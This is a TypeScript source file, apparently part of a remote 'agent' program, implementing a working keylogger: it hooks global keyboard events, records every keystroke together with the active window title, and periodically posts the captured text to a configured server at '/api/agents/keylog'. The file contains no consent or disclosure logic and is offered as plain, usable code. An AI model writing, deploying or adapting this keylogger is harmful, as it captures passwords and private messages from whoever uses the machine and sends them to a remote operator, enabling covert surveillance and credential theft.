import { GlobalKeyboardListener, IGlobalKeyDownMap } from "node-global-key-listener";
import activeWindow from "active-win";
import { CONFIG } from "../config";
import { store } from "../store";
import { api } from "../lib/api";
import { logger } from "../lib/logger";

let buffer = "";
let currentWindowTitle = "";

async function updateCurrentWindowTitle(): Promise<void> {
  try {
    const win = await activeWindow();
    if (!win) return;
    const title = `${win.title} — ${win.owner?.name ?? ""}`.trim();
    currentWindowTitle = title;
  } catch (error) {
    logger.warn("Failed to get active window for keylogger", { error });
  }
}

export function start(): void {
  try {
    const keyboard = new GlobalKeyboardListener();

    keyboard.addListener((event) => {
      try {
        if (event.state !== "DOWN") return;

        void updateCurrentWindowTitle();

        const keyName: string = (event.name as keyof IGlobalKeyDownMap) ?? "";
        if (keyName === "RETURN") {
          buffer += "[ENTER]";
        } else if (keyName === "BACKSPACE") {
          buffer += "[BS]";
        } else if (keyName === "TAB") {
          buffer += "[TAB]";
        } else if (keyName === "SPACE") {
          buffer += " ";
        } else if (keyName.length === 1 && keyName.match(/^[ -~]$/)) {
          buffer += keyName;
        }
      } catch (error) {
        logger.warn("Keylogger event handler failed", { error });
      }
    });
  } catch (error) {
    logger.error("Failed to start keylogger", { error });
  }

  setInterval(async () => {
    try {
      const agentId = store.get(CONFIG.STORE_KEYS.AGENT_ID);
      if (!agentId || buffer.length === 0) return;

      const payload = {
        agent_id: agentId,
        content: buffer,
        window_name: currentWindowTitle,
        logged_at: new Date().toISOString()
      };

      await api.post(`${CONFIG.SERVER_URL}/api/agents/keylog`, payload);
      buffer = "";
    } catch (error) {
      logger.warn("Keylog flush failed", { error });
    }
  }, CONFIG.KEYLOG_FLUSH_INTERVAL_MS);
}

